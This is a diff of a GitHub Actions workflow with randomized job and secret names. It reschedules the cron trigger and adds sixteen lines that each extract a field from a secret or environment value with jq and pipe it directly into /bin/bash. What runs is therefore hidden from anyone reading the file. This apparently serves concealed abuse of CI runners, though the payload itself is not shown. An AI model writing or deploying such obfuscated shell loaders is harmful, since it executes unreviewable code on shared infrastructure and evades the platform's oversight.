@@ -2,7 +2,8 @@ name: zhushaoyun6981
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 4/6 * * *'
+    - cron: '2 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +11,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhushaoyun6981
         env:
-          jceu0: ${{ secrets.jceu0 }}
+          ft1650: ${{ secrets.ft1650 }}
         run: |
-          echo $jceu0 | jq -r .yorov85 | /bin/bash
-          echo $jfcew85110 | jq -r .jzuip23885 | /bin/bash
-          echo $b75843 | jq -r .qjmtc0 | /bin/bash
-          echo $d551 | jq -r .dso1279 | /bin/bash
-          echo $arh0139 | jq -r .tdcb0 | /bin/bash
-          echo $q85 | jq -r .ssqiq4807 | /bin/bash
-          echo $y87 | jq -r .jiuiu81 | /bin/bash
+          echo $ft1650 | jq -r .ajj93 | /bin/bash
+          echo $pehh953 | jq -r .ok89534 | /bin/bash
+          echo $lbmt220 | jq -r .zrz04874 | /bin/bash
+          echo $nzk0 | jq -r .bb43199 | /bin/bash
+          echo $t92336 | jq -r .lht6 | /bin/bash
+          echo $pi987 | jq -r .g2 | /bin/bash
+          echo $q8363 | jq -r .tzjoq01 | /bin/bash
+          echo $ghl3 | jq -r .mrw6 | /bin/bash
+          echo $vd054 | jq -r .trkuz10173 | /bin/bash
+          echo $y71000 | jq -r .nu09589 | /bin/bash
+          echo $axtp9 | jq -r .sjwp17340 | /bin/bash
+          echo $tsysj0064 | jq -r .ok103 | /bin/bash
+          echo $my441 | jq -r .hexno9 | /bin/bash
+          echo $cjwpl12 | jq -r .a09 | /bin/bash
+          echo $qig546 | jq -r .ngx06232 | /bin/bash
+          echo $cdoly78815 | jq -r .zam9 | /bin/bash
 
